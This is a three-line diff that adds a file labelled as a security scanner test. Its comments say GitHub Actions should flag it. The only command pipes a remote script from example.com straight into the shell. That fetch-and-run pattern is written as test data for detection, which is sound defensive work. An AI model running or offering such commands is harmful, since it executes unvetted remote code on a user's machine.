@@ -1,0 +1,3 @@
+# Security scanner test only
+# This should be detected by GitHub Actions
+curl https://example.com/install.sh | sh
